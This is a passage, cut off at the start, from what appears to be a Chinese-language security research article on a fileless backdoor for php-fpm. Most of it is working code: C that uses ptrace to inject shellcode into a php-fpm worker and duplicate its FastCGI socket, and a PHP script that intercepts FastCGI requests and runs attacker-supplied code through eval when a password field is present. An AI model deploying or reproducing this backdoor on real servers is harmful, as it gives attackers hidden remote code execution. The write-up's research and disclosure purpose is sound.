        memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));
        oldcode = (unsigned char *)malloc(sizeof(shellcode));
        // Find a place to write our code to
        freeaddr = (void *)freeSpaceAddr(pid) + sizeof(long);
        // Read from this addr to back up our code
        ptraceRead(pid, (unsigned long long)freeaddr, oldcode, sizeof(shellcode));
        // Write our new stub
        //ptraceWrite(pid, (unsigned long long)freeaddr, "/tmp/inject.sox00", 16);
        //ptraceWrite(pid, (unsigned long long)freeaddr+16, "x90x90x90x90x90x90x90", 8);
        ptraceWrite(pid, (unsigned long long)freeaddr, shellcode, sizeof(shellcode));
        // Update RIP to point to our code
        regs.rip = (unsigned long long)freeaddr + 2;
        // Set regs
        ptrace(PTRACE_SETREGS, pid, NULL, &regs);
        //sleep(5);
        // Continue execution
        ptrace(PTRACE_CONT, pid, NULL, NULL);
        waitpid(pid, &status, WUNTRACED);
        // Ensure that we are returned because of our int 0x3 trap
        if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
            // Get process registers, indicating if the injection suceeded
            ptrace(PTRACE_GETREGS, pid, NULL, &regs);
            if (regs.rax != 0x0) {
                printf("[*] Syscall for dup2 success.n");
            } else {
                printf("[!] Library could not be injectedn");
                return 0;
            }
            //// Now We Restore The Application Back To It's Original State ////
            // Copy old code back to memory
            ptraceWrite(pid, (unsigned long long)freeaddr, oldcode, sizeof(shellcode));
            // Set registers back to original value
            ptrace(PTRACE_SETREGS, pid, NULL, &oldregs);
            // Resume execution in original place
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            printf("[*] Resume proccess.n");
        } else {
            printf("[!] Fatal Error: Process stopped for unknown reasonn");
            exit(1);
        }
        return 0;
    }
代码中注入的部分参考自网上，shellcode功能很简单，通过syscall调用dup2(0,4)，汇编为：
       5:    6a 21                    pushq  $0x21
       7:    58                       pop    %rax
       8:    48 31 ff                 xor    %rdi,%rdi
       b:    6a 04                    pushq  $0x4
       d:    5e                       pop    %rsi
       e:    0f 05                    syscall 
      10:    cc                       int3
使用如下php代码进行注入测试并观察效果：
     socket:[1168542]
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 1 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 2 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 17:59 3 -> socket:[1428126]
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 7 -> anon_inode:[eventpoll]
    [root@localhost html]# ls -al /proc/3022/fd
    total 0
    dr-x------ 2 nginx nginx  0 Oct 25 16:12 .
    dr-xr-xr-x 9 nginx nginx  0 Oct 25 16:12 ..
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 0 -> socket:[1168542]
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 1 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 2 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 17:59 3 -> socket:[1428126]
    lrwx------ 1 nginx nginx 64 Oct 25 17:59 4 -> socket:[1435131]
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 7 -> anon_inode:[eventpoll]
    [root@localhost html]# ls -al /proc/3022/fd
    total 0
    dr-x------ 2 nginx nginx  0 Oct 25 16:12 .
    dr-xr-xr-x 9 nginx nginx  0 Oct 25 16:12 ..
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 0 -> socket:[1168542]
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 1 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 2 -> /dev/null
    lrwx------ 1 nginx nginx 64 Oct 25 17:59 3 -> socket:[1428126]
    lrwx------ 1 nginx nginx 64 Oct 25 17:59 4 -> socket:[1168542]
    lrwx------ 1 nginx nginx 64 Oct 25 17:50 7 -> anon_inode:[eventpoll]
可以看到worker进程在前10秒内只有来自nginx的一个3号句柄；10-20秒多出来的4号句柄socket:[1435131]为php代码中socket_create后创建的socket；20秒后dup4运行结束，dup(0,2)成功调用，0号句柄的socket:[1168542]成功复制到4号句柄。此时php代码中已经可以通过$socket来操作php-fpm监听tcp 9000的socket了。
附上一个简单实现的脚本，通过php来解析fast-cgi并拦截特定请求：
     0) {
                dolog("Read " . $body_len . " bytes body.");
                $data = socket_read($socket, $body_len);
                if ($data === "")
                    return -1;
                $buffer .= $data;
                dolog(bin2hex($data));
                if ($header["type"] == 5) {
                    $postdata .= $data;
                    dolog("Post data found.");
                }
            }
            if ($header["type"] == $type && $body_len  true, "buffer" => $postdata);
        } else {
            dolog("No password, passthrough.");
            return array("intercept" => false, "buffer" => $buffer);
        }
    }
    dolog("Init socket rescoure.");
    $socket = socket_create( AF_INET, SOCK_STREAM, SOL_TCP );
    dolog("dup(0,4);");
    system('/tmp/dup04');
    dolog("All set, waiting for connections.");
    while (1) {
        $acpt=socket_accept($socket);
        dolog("Incoming connection.");
        $buffer = readfcgi($acpt,5);
        if ($buffer["intercept"] === true) {
            parse_str($buffer["buffer"], $postdata);
            $header = "";
            $outbuffer = "Content-type: text/htmlrnrn";
            ob_clean();
            ob_start();
            eval($postdata[$password]);
            $outbuffer .= ob_get_clean();
            dolog("Eval code success.");
            $outbuffer_len = strlen($outbuffer);
            dolog("Outbuffer length: " . $outbuffer_len . "bytes.");
            $slice_len = unpack("n", "x1fxf8");
            $slice_len = $slice_len[1];
            while ( strlen($outbuffer) > $slice_len ) {
                $slice = substr($outbuffer, 0, $slice_len);
                $header = pack("C2n2C2", 0x01, 0x06, 1, $slice_len, 0x00, 0x00);
                $sent_len = socket_write($acpt, $header, 8);
                dolog("Sending " . $sent_len . " bytes slice header.");
                dolog(bin2hex($header));
                $sent_len = socket_write($acpt, $slice, $slice_len);
                dolog("Sending " . $sent_len . " bytes slice.");
                dolog(bin2hex($slice));
                $outbuffer = substr($outbuffer, $slice_len);
            }
            $outbuffer_len = strlen($outbuffer);
            if ( $outbuffer_len % 8 > 0)
                $padding_len = 8 - ($outbuffer_len % 8);
            dolog("Processing last slice, outbuffer length: " . $outbuffer_len . " , padding length: " . $padding_len . " bytes.");
            $outbuffer .= str_repeat("", $padding_len);
            $header = pack("C2n2C2", 0x01, 0x06, 1, $outbuffer_len, $padding_len, 0x00);
            $sent_len = socket_write($acpt, $header, 8);
            dolog("Sent 8 bytes STDOUT header to webserver.");
            dolog(bin2hex($header));
            $sent_len = socket_write($acpt, $outbuffer, strlen($outbuffer));
            dolog("Sent " . $sent_len . " bytes STDOUT body to webserver.");
            dolog(bin2hex($outbuffer));
            $header = pack("C2n2C2", 0x01, 0x03, 1, 8, 0x00, 0x00);
            $endbody = pack("C8", 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0);
            $sent_len = socket_write($acpt, $header, 8);
            dolog("Sent 8 bytes REQUEST_END header to webserver.");
            dolog(bin2hex($header));
            $sent_len = socket_write($acpt, $endbody, 8);
            dolog("Sent 8 bytes REQUEST_END body to webserver.");
            dolog(bin2hex($endbody));
            socket_shutdown($acpt);
            continue;
        } else {
            $buffer = $buffer["buffer"];
        }
        dolog("The full buffer size is " . strlen($buffer) . " bytes.");
        $fpm_socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if ($fpm_socket === false) {
            dolog("Create socket for real php-fpm failed.");
            socket_close($acpt);
        }
        if (socket_connect($fpm_socket, "127.0.0.1", 9000) === false) {
            dolog("Connect to real php-fpm failed.");
            socket_close($acpt);
        }
        dolog("Connected to real php-fpm.");
        $sent_len = socket_write($fpm_socket, $buffer, strlen($buffer));
        dolog("Sent " . $sent_len . " to real php-fpm.");
        $buffer = readfcgi($fpm_socket, 3);
        //TODO: intercept real output
        $buffer = $buffer["buffer"];
        dolog("Recieved " . strlen($buffer) . " from real php-fpm.");
        socket_close($fpm_socket);
        $sent_len = socket_write($acpt, $buffer);
        dolog("Sent " . $sent_len . " bytes back to webserver.");
        socket_shutdown($acpt);
        dolog("Shutdown connection from webserver.");
    }
## 利用限制
上面给出的php实现，利用的前提是Linux下的php-fpm环境，同时有php版本限制，需5.x<5.6.35，7.0.x<7.0.29，7.1.x<7.1.16，7.2.x<7.2.4。因为利用到的两个前提条件中，worker进程未正确设置dumpable
flag这个问题已经在CVE-2018-10545中修复，详情请自行查阅。而另一个条件，在php中通过system等函数来调用第三方程序时未正确处理文件描述符的问题，也已经提交给php官方，但php官方认为未能导致安全问题，不予处理。所以截止目前为止，最新版本的php-fpm都存在文件描述符泄露的问题。
## 总结
本文分享了一种php-fpm的另类后门实现，但比较受限。该方法虽然实现了无文件、无进程、能主动触发等特性，但是无法实现持续化，php-fpm服务重启后即失效；同时由于生产环境中php-fpm的worker进程众多，fast-cgi请求能被我们accept接受到的几率也比较小，不能稳定的触发。仅希望本文能抛砖引玉，引起大家对该问题进行更深入的探讨。如文中存在描述不准确的地方，欢迎大家批评指正。
当然如果你愿意同我们一起进行安全技术的研究和探索，请发送简历到 [PI:EMAIL](mailto:PI:EMAIL)，我们期望你的加入。